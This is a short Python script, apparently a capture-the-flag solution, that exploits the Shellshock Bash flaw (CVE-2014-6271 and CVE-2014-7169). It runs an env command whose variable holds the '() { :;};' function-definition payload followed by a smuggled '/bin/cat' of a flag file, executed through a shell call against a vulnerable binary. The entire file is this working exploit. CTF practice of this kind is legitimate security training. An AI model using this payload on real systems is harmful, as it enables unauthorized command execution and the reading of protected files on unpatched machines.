import subprocess
# tip:
#     use CVE-2014-6271 or CVE-2014-7169

DEBUG = True

if not DEBUG:
    shellshock = "env vuln='() { :;}; /bin/cat /home/shellshock/flag' /home/shellshock/shellshock"
else:
    shellshock = "env vuln='() { :;}; /bin/cat /root/Desktop/flag' /root/Desktop/shellshock"

subprocess.call(shellshock, shell=True)
